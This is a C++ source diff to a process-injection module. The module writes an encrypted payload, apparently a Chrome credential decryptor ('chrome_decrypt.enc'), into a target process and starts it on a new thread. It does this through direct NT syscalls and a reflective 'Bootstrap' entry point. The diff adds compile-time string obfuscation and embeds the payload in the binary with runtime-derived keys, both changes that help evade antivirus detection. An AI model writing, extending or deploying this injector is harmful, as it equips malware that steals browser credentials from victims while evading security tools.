@@ -4,8 +4,8 @@
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
 #include "../sys/internal_api.hpp"
+#include "../payload/payload_data.hpp"
 #include <sstream>
-#include <fstream>
 
 namespace Injector {
 
@@ -13,17 +13,17 @@ namespace Injector {
         : m_process(process), m_console(console) {}
 
     void PayloadInjector::Inject(const std::wstring& pipeName) {
-        m_console.Debug("Deriving runtime decryption keys...");
+        m_console.Debug(OBF("Deriving runtime decryption keys..."));
         LoadAndDecryptPayload();
-        m_console.Debug("  [+] Payload decrypted (" + std::to_string(m_payload.size() / 1024) + " KB)");
+        m_console.Debug(std::string(OBF(" [+] Payload decrypted (")) + std::to_string(m_payload.size() / 1024) + OBF(" KB)"));
 
-        DWORD offset = GetExportOffset("Bootstrap");
+        DWORD offset = GetExportOffset(OBF("Bootstrap"));
         if (offset == 0) {
-            throw std::runtime_error("Could not find entry point in payload");
+            throw std::runtime_error(OBF("Could not find entry point in payload"));
         }
-        
+       
         std::stringstream ss;
-        ss << "  [+] Bootstrap entry point resolved (offset: 0x" << std::hex << offset << ")";
+        ss << OBF(" [+] Bootstrap entry point resolved (offset: 0x") << std::hex << offset << OBF(")");
         m_console.Debug(ss.str());
 
         PVOID remoteBase = nullptr;
@@ -31,91 +31,58 @@ namespace Injector {
         SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
         SIZE_T totalSize = payloadSize + pipeNameSize;
 
-        m_console.Debug("Allocating memory in target process via syscall...");
+        m_console.Debug(OBF("Allocating memory in target process via syscall..."));
         NTSTATUS status = NtAllocateVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase, 0,
                                                           &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (status != 0) throw std::runtime_error("Allocation failed");
+        if (status != 0) throw std::runtime_error(OBF("Allocation failed"));
 
         ss.str("");
-        ss << "  [+] Memory allocated at 0x" << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
-           << " (" << std::dec << (totalSize / 1024) << " KB)";
+        ss << OBF(" [+] Memory allocated at 0x") << std::hex << reinterpret_cast<uintptr_t>(remoteBase)
+           << OBF(" (") << std::dec << (totalSize / 1024) << OBF(" KB)");
         m_console.Debug(ss.str());
 
         SIZE_T written = 0;
         status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remoteBase,
                                               m_payload.data(), payloadSize, &written);
-        if (status != 0) throw std::runtime_error("Write payload failed");
+        if (status != 0) throw std::runtime_error(OBF("Write payload failed"));
 
         LPVOID remotePipeName = reinterpret_cast<uint8_t*>(remoteBase) + payloadSize;
         status = NtWriteVirtualMemory_syscall(m_process.GetProcessHandle(), remotePipeName,
                                               (PVOID)pipeName.c_str(), pipeNameSize, &written);
-        if (status != 0) throw std::runtime_error("Write params failed");
-        m_console.Debug("  [+] Payload + parameters written");
+        if (status != 0) throw std::runtime_error(OBF("Write params failed"));
+
+        m_console.Debug(OBF(" [+] Payload + parameters written"));
 
         ULONG oldProtect = 0;
         status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
                                                 &totalSize, PAGE_EXECUTE_READ, &oldProtect);
-        if (status != 0) throw std::runtime_error("Protection change failed");
-        m_console.Debug("  [+] Memory protection set to PAGE_EXECUTE_READ");
+        if (status != 0) throw std::runtime_error(OBF("Protection change failed"));
+
+        m_console.Debug(OBF(" [+] Memory protection set to PAGE_EXECUTE_READ"));
 
         uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;
         HANDLE hThread = nullptr;
-
-        m_console.Debug("Creating remote thread via syscall...");
+        m_console.Debug(OBF("Creating remote thread via syscall..."));
         status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, nullptr, m_process.GetProcessHandle(),
                                           (LPTHREAD_START_ROUTINE)entry, remotePipeName, 0, 0, 0, 0, nullptr);
-        
-        if (status != 0) throw std::runtime_error("Thread creation failed");
+       
+        if (status != 0) throw std::runtime_error(OBF("Thread creation failed"));
 
         ss.str("");
-        ss << "  [+] Thread created (entry: 0x" << std::hex << entry << ")";
+        ss << OBF(" [+] Thread created (entry: 0x") << std::hex << entry << OBF(")");
         m_console.Debug(ss.str());
+
         if (hThread) NtClose_syscall(hThread);
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
-        // Load encrypted payload from external file (reduces binary entropy)
-        std::filesystem::path payloadPath = GetPayloadFilePath();
-        
-        std::ifstream file(payloadPath, std::ios::binary);
-        if (!file) {
-            throw std::runtime_error("Cannot open payload file: " + payloadPath.string());
-        }
-
-        m_payload.assign(
-            std::istreambuf_iterator<char>(file),
-            std::istreambuf_iterator<char>()
-        );
-        file.close();
-
+        m_payload.assign(Payload::Embedded::Data, Payload::Embedded::Data + Payload::Embedded::Size);
         if (m_payload.empty()) {
-            throw std::runtime_error("Payload file is empty: " + payloadPath.string());
+            throw std::runtime_error(OBF("Embedded payload is empty"));
         }
-
-        // Use runtime-derived keys (no static keys in binary)
         if (!Crypto::DecryptPayload(m_payload)) {
-            throw std::runtime_error("Failed to derive decryption keys");
+            throw std::runtime_error(OBF("Failed to derive decryption keys"));
         }
-    }
-
-    std::filesystem::path PayloadInjector::GetPayloadFilePath() {
-        // Look for chrome_decrypt.enc next to the executable
-        wchar_t exePath[MAX_PATH] = {};
-        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
-        std::filesystem::path dir = std::filesystem::path(exePath).parent_path();
-        std::filesystem::path payloadPath = dir / "chrome_decrypt.enc";
-
-        if (std::filesystem::exists(payloadPath)) {
-            return payloadPath;
-        }
-
-        // Fallback: current working directory
-        payloadPath = std::filesystem::current_path() / "chrome_decrypt.enc";
-        if (std::filesystem::exists(payloadPath)) {
-            return payloadPath;
-        }
-
-        throw std::runtime_error("Payload file not found. Ensure chrome_decrypt.enc is in the same directory as the executable.");
     }
 
     DWORD PayloadInjector::GetExportOffset(const char* exportName) {
@@ -144,7 +111,6 @@ namespace Injector {
         auto names = (DWORD*)RvaToPtr(exportDir->AddressOfNames);
         auto ordinals = (WORD*)RvaToPtr(exportDir->AddressOfNameOrdinals);
         auto funcs = (DWORD*)RvaToPtr(exportDir->AddressOfFunctions);
-
         if (!names || !ordinals || !funcs) return 0;
 
         for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
@@ -157,5 +123,4 @@ namespace Injector {
         }
         return 0;
     }
-
 }
